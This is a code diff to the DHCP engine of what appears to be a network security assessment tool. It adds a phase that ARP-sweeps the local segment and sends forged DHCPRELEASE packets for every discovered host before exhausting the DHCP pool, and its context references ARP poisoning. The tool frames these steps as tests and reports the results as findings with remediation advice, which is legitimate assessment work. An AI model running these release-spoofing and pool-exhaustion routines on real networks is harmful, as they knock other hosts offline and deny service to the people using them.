@@ -220,7 +220,9 @@ class DhcpEngine:
         if pending:
             self._debug(f"restore: releasing {len(pending)} acquired lease(s)")
         for lease in pending:
-            pkt = packets.build_release_v4(lease.mac, lease.ip, lease.server_ip, lease.xid)
+            pkt = packets.build_release_v4(
+                lease.mac, lease.ip, lease.server_ip, lease.xid, server_mac=lease.server_mac
+            )
             self._send(pkt)  # releasing our own leases; not scope-gated
             lease.released = True
             self.releases += 1
@@ -342,8 +344,9 @@ class DhcpEngine:
                 out.reason = "server replied NAK"
                 return out
             offer = self._control_offer
-            sid, _, offered_ip, subnet = packets.parse_offer(offer)
+            sid, server_mac, offered_ip, subnet = packets.parse_offer(offer)
             out.offered_ip, out.server_id, out.subnet = offered_ip, sid, subnet
+            out.server_mac = server_mac or None
             lt = packets.dhcp_option(offer[DHCP].options, "lease_time")
             out.lease_time = int(lt) if isinstance(lt, int) else None
             self._debug(f"CONTROL[{phase}/{client}] OFFER {offered_ip} from {sid} subnet={subnet}")
@@ -359,7 +362,7 @@ class DhcpEngine:
                 f"CONTROL[{phase}/{client}] ACK {offered_ip} — this client can obtain a lease"
             )
             # give the address straight back; the control must not consume pool capacity
-            self._send(packets.build_release_v4(mac, offered_ip, sid, xid))
+            self._send(packets.build_release_v4(mac, offered_ip, sid, xid, server_mac=server_mac))
             self._debug(f"CONTROL[{phase}/{client}] RELEASE {offered_ip}")
         except Exception as exc:  # a broken control must never kill the run
             out.reason = f"error: {exc!r}"
@@ -642,20 +645,30 @@ class DhcpEngine:
             self._neighbors_by_mac[fp.mac] = updated
             self.bus.emit(ev.NeighborFound(neighbor=updated))
 
-    def _do_release(self, neighbors: list[Neighbor], server_ip: str) -> int:
+    def _do_release(
+        self, neighbors: list[Neighbor], server_ip: str, server_mac: str | None = None
+    ) -> int:
         """Send DHCPRELEASE for in-scope neighbors. Returns count sent. Unit-testable."""
         sent = 0
         for n in neighbors:
             if self._stop.is_set():
                 break
             xid = _rand_xid()
-            pkt = packets.build_release_v4(n.mac, n.ip, server_ip, xid)
+            pkt = packets.build_release_v4(n.mac, n.ip, server_ip, xid, server_mac=server_mac)
             if self._send(pkt, target_ip=n.ip):
                 sent += 1
                 self.releases += 1
                 self.bus.emit(
                     ev.LeaseReleased(
-                        lease=Lease(n.mac, n.ip, server_ip, xid, self.cfg.ip_version, released=True)
+                        lease=Lease(
+                            n.mac,
+                            n.ip,
+                            server_ip,
+                            xid,
+                            self.cfg.ip_version,
+                            released=True,
+                            server_mac=server_mac,
+                        )
                     )
                 )
         return sent
@@ -720,11 +733,18 @@ class DhcpEngine:
         self._start_senders()
 
     def _exhaust_prelude(self) -> None:
-        """Baseline the segment, then hand off to the senders.
+        """Baseline the segment, release what's there, then hand off to the senders.
 
-        Order matters: the ARP inventory records who was on the network *before* we touched it,
-        and the controls establish what a normal client could do beforehand. Without those
-        baselines a null result at the end can't be interpreted.
+        Order matters:
+          1. ARP inventory — who was on the network *before* we touched it.
+          2. control/self — proves DHCP is reachable and (as a side effect) learns the real
+             server's identity, which the release phase needs.
+          3. control/new — the baseline the final verdict is judged against.
+          4. release phase — free the leases of hosts we just inventoried, so "take every
+             address in the range" has somewhere to go rather than only mopping up whatever
+             was already free.
+          5. senders.
+        Without the baselines a null result at the end can't be interpreted.
         """
         if self.cfg.arp_sweep:
             self._baseline_arp_scan()
@@ -732,7 +752,89 @@ class DhcpEngine:
             self.control_pre = self._control_transaction("pre", client="self")
             self.control_pre_new = self._control_transaction("pre", client="new")
         if not self._stop.is_set():
+            self._release_phase()
+        if not self._stop.is_set():
             self._start_senders()
+
+    def _release_phase(self) -> None:
+        """Release the leases of every ARP-discovered neighbor before exhausting.
+
+        Needs a real server identity — sourced from `control_pre`, never guessed — or every
+        RELEASE would carry server_id=0.0.0.0 and be silently dropped (the bug this phase
+        exists to not repeat). Skips itself with a Debug, rather than sending garbage, when
+        that identity isn't available.
+        """
+        if not self.cfg.release_neighbors:
+            self._debug("release phase skipped: release_neighbors is disabled")
+            return
+        pre = self.control_pre
+        if pre is None or not pre.success or not pre.server_id:
+            self._debug(
+                "release phase skipped: no confirmed server identity yet "
+                f"(control={self.cfg.control}, pre_ok={bool(pre and pre.success)})"
+            )
+            return
+        server_id, server_mac = pre.server_id, pre.server_mac
+        neighbors = [
+            n
+            for n in self._neighbors_by_mac.values()
+            if n.ip not in (server_id, self._release_gateway())
+        ]
+        if not neighbors:
+            self._debug("release phase: no ARP-discovered neighbors to release")
+            return
+        self._debug(
+            f"release phase: sending DHCPRELEASE for {len(neighbors)} neighbor(s) via "
+            f"server {server_id} ({server_mac or 'MAC unknown, broadcasting'})"
+        )
+        sent = self._do_release(neighbors, server_id, server_mac=server_mac)
+        stopped = self._reprobe_released(neighbors)
+        self._debug(
+            f"release phase: {sent} RELEASE sent, {stopped}/{len(neighbors)} target(s) "
+            "stopped answering ARP afterward"
+        )
+        self._raise(
+            Finding(
+                id="NEIGHBOR_LEASES_RELEASED",
+                title="Sent DHCPRELEASE for ARP-discovered neighbors before exhausting",
+                verdict=INFO,
+                severity="medium",
+                evidence={
+                    "targets": len(neighbors),
+                    "released_sent": sent,
+                    "stopped_answering_arp": stopped,
+                    "server_id": server_id,
+                },
+                recommendation=(
+                    "The server appears to ignore unauthenticated RELEASE from a third party "
+                    "(the desired behavior)."
+                    if stopped == 0
+                    else "The server acted on unauthenticated RELEASE requests for addresses "
+                    "held by other hosts on the segment — any host can force another off its "
+                    "lease. This is independent of pool exhaustion and worth reporting on its "
+                    "own; verify DHCP snooping / binding validation on the access switch."
+                ),
+            )
+        )
+
+    def _release_gateway(self) -> str | None:
+        from .netutils import default_gateway
+
+        return default_gateway(self.cfg.interface)
+
+    def _reprobe_released(self, neighbors: list[Neighbor]) -> int:
+        """Re-ARP the just-released addresses; count how many stopped answering.
+
+        Servers vary in whether they honour an unauthenticated RELEASE, so report the observed
+        effect rather than assume frames-sent implies addresses-freed.
+        """
+        if self.cfg.dry_run or not neighbors:
+            return 0
+        time.sleep(1.0)  # give hosts/switch a moment before re-probing
+        cidrs = [f"{n.ip}/32" for n in neighbors]
+        still_present, _ = self._discover_neighbors(cidrs)
+        still_ips = {n.ip for n in still_present}
+        return sum(1 for n in neighbors if n.ip not in still_ips)
 
     def _baseline_arp_scan(self) -> None:
         """ARP-sweep the segment for a pre-run inventory of live hosts."""
@@ -862,9 +964,15 @@ class DhcpEngine:
         from scapy.all import BOOTP
 
         mac = packets.client_mac_from_offer(pkt)
-        server_id, _, ip, _ = packets.parse_offer(pkt)
+        server_id, server_mac, ip, _ = packets.parse_offer(pkt)
         lease = Lease(
-            mac, ip, server_id, pkt[BOOTP].xid, self.cfg.ip_version, acquired_at=time.time()
+            mac,
+            ip,
+            server_id,
+            pkt[BOOTP].xid,
+            self.cfg.ip_version,
+            acquired_at=time.time(),
+            server_mac=server_mac or None,
         )
         self.cleanup.register(lease)
         self.acks += 1
@@ -948,9 +1056,24 @@ class DhcpEngine:
 
     def _release_worker(self) -> None:
         # no scope given -> fall back to the interface's own network
-        neighbors, server_ip = self._discover_neighbors(self._sweep_cidrs())
+        neighbors, _ = self._discover_neighbors(self._sweep_cidrs())
         self._debug(f"release: {len(neighbors)} neighbor(s) discovered in scope")
-        self._do_release(neighbors, server_ip or "0.0.0.0")
+        # _discover_neighbors is ARP-only and never learns a DHCP server identity. (BUG FIX,
+        # 2.1) this mode used to send every RELEASE to 0.0.0.0, which no server honours — run a
+        # quick self-MAC control cycle to learn the real server before sending anything.
+        if not self.cfg.control:
+            self._debug("release: skipped — --no-control means no server identity is known")
+            return
+        pre = self._control_transaction("pre", client="self")
+        self.control_pre = pre
+        if not pre.success or not pre.server_id:
+            self._debug(f"release: skipped — could not learn a server identity ({pre.reason})")
+            return
+        if not neighbors:
+            self._debug("release: no neighbors to release")
+            return
+        sent = self._do_release(neighbors, pre.server_id, server_mac=pre.server_mac)
+        self._debug(f"release: sent {sent} RELEASE via server {pre.server_id}")
 
     def _run_garp(self) -> None:
         # watch ARP while poisoning, so we can tell whether targets fight back
